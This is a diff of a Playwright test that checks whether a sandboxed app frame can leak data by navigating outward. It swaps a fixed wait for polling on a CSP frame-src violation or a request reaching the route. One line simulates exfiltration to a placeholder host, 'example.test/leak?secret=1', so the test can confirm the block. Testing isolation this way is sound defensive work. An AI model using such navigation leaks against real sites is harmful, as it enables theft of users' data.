@@ -344,12 +344,25 @@ test('S-2 (browser part): an app frame cannot reach the parent, the top window, 
   })
   expect(page.url()).toBe(topUrl)
 
-  // A way to leak a value by navigating its own frame outward — the proxy's frame-src blocks this
+  /*
+   * A way to leak a value by navigating its own frame outward — the proxy's frame-src blocks this.
+   * Waiting a fixed time and then finding nothing proves nothing on a loaded machine (the request
+   * may simply not have gone out yet, #845), so the test waits for one of the two outcomes to be
+   * seen: the proxy reports the frame-src violation, or the request reaches the route.
+   */
+  const proxy = inner.parentFrame()!
+  await proxy.evaluate(() => {
+    const w = window as any
+    w.__violations = []
+    document.addEventListener('securitypolicyviolation', (e) => w.__violations.push({ directive: e.effectiveDirective, blocked: e.blockedURI }))
+  })
   await inner.evaluate(() => {
     location.href = 'https://example.test/leak?secret=1'
   }).catch(() => {})
-  await page.waitForTimeout(500)
+  const violations = () => proxy.evaluate(() => (window as any).__violations as { directive: string; blocked: string }[])
+  await expect.poll(async () => leaked.length + (await violations()).length, { timeout: 15_000 }).toBeGreaterThan(0)
   expect(leaked).toEqual([])
+  expect(await violations()).toEqual([{ directive: 'frame-src', blocked: expect.stringMatching(/^https:\/\/example\.test/) }])
 })
 
 test('per-app origin mode: gets a real origin on its own port, storage is separated per app, and reopening gets the same origin', async ({ page }) => {
